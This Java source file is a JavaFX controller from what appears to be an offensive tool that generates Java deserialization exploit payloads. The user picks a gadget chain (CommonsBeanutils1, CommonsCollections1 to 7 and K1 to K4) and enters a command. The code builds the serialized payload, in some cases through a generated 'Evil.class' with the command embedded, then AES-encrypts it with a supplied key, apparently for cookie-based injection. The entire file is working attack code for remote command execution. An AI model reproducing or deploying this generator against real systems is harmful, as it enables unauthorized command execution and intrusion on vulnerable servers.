package cn.safe6.controller;

import cn.safe6.core.Constants;
import cn.safe6.payload.shortPayload.asm.Resolver;
import cn.safe6.payload.shortPayload.payload.*;
import cn.safe6.util.PayloadEncryptTool;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.scene.control.*;

import java.io.File;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class PayloadGen {
    public TextField keyTF;
    public ChoiceBox gadget;
    public TextField cmd;
    public CheckBox aesType;
    public TextArea out;
    public Button genButton;


    public void initialize() {
        ObservableList<String> gadgetData = FXCollections.observableArrayList();
        gadgetData.add("cb1");
        gadgetData.add("cc1");
        gadgetData.add("cc2");
        gadgetData.add("cc3");
        gadgetData.add("cc4");
        gadgetData.add("cc5");
        gadgetData.add("cc6");
        gadgetData.add("cc7");
        gadgetData.add("cck1");
        gadgetData.add("cck2");
        gadgetData.add("cck4");
        gadgetData.add("cck3");
        gadget.setValue("cb1");
        gadget.setItems(gadgetData);
        out.setWrapText(true);
    }

    public void gen(ActionEvent actionEvent) throws Exception {

        Platform.runLater(() -> {
            genButton.setDisable(true);
        });
        genButton.setDisable(true);
        genButton.setDisable(true);

        String gadgetName=gadget.getSelectionModel().getSelectedItem().toString();
        String command =cmd.getText();
        byte[] payload = new byte[0];
        String key = keyTF.getText();

        switch (gadgetName.toUpperCase()) {
            case "CB1":
                System.out.println("CommonsBeanutils1");
                payload =resolveTemplatesPayload(CB1.class, command);
                break;
            case "CC1":
                System.out.println("CommonsCollections1");
                payload =resolveNormalPayload(CC1.class, command);
                break;
            case "CC2":
                System.out.println("CommonsCollections2");
                payload = resolveTemplatesPayload(CC2.class, command);
                break;
            case "CC3":
                System.out.println("CommonsCollections3");
                payload = resolveTemplatesPayload(CC3.class, command);
                break;
            case "CC4":
                System.out.println("CommonsCollections4");
                payload = resolveTemplatesPayload(CC4.class, command);
                break;
            case "CC5":
                System.out.println("CommonsCollections5");
                payload = resolveNormalPayload(CC5.class, command);
                break;
            case "CC6":
                System.out.println("CommonsCollections6");
                payload = resolveNormalPayload(CC6.class, command);
                break;
            case "CC7":
                System.out.println("CommonsCollections7");
                payload = resolveNormalPayload(CC7.class, command);
                break;
            case "CCK1":
                System.out.println("CommonsCollectionsK1");
                payload = resolveTemplatesPayload(CCK1.class, command);
                break;
            case "CCK2":
                System.out.println("CommonsCollectionsK2");
                payload = resolveTemplatesPayload(CCK2.class, command);
                break;
            case "CCK3":
                System.out.println("CommonsCollectionsK3");
                payload =  resolveNormalPayload(CCK3.class, command);
                break;
            case "CCK4":
                System.out.println("CommonsCollectionsK4");
                payload =  resolveNormalPayload(CCK4.class, command);
                break;
            default:
                System.out.println("error gadget name");
        }
        String encryptData;
        if (aesType.getText().equals(Constants.AES_GCM)) {
            encryptData = PayloadEncryptTool.AesGcmEncrypt(payload, key);
        } else {
            encryptData = PayloadEncryptTool.AesCbcEncrypt(payload, key);
        }
        out.setText(encryptData);
        out.appendText("\r\n");
        out.appendText("\r\n");
        out.appendText(String.format("payload长度:%s",encryptData.length()));
        out.appendText("\r\n");
        Platform.runLater(() -> {
            genButton.setDisable(false);
        });
    }


    private static byte[] resolveNormalPayload(Class<?> target,
                                             String command) throws Exception {
        Method method = target.getMethod("getPayloadUseCommand", String.class);
        byte[] payload = (byte[]) method.invoke(null, command);
        //byte[] data = Base64.getEncoder().encode(payload);
        return payload;
        //System.out.println("Payload length: " + new String(data).length());
        //System.out.println("Write Base64 Payload output.txt...");
       // Files.write(Paths.get("output.txt"), data);

    }

    @SuppressWarnings("all")
    private static byte[] resolveTemplatesPayload(Class<?> target,
                                                String command) throws Exception {
        String path = System.getProperty("user.dir") + File.separator + "Evil.class";
        Generator.saveTemplateImpl(path, command);
        Resolver.resolve("Evil.class");
        byte[] newByteCodes = Files.readAllBytes(Paths.get("Evil.class"));
        Method method = target.getMethod("getPayloadUseByteCodes", byte[].class);
        byte[] payload = (byte[]) method.invoke(null, newByteCodes);
        //byte[] payload = Base64.getEncoder().encode((byte[]) method.invoke(null, newByteCodes));
        //System.out.println("Payload length: " + new String(payload).length());
        //System.out.println("Write Base64 Payload output.txt...");
       // Files.write(Paths.get("output.txt"), payload);
        Files.delete(Paths.get("Evil.class"));
        //Files.delete(Paths.get(path));
        return payload;
    }
}
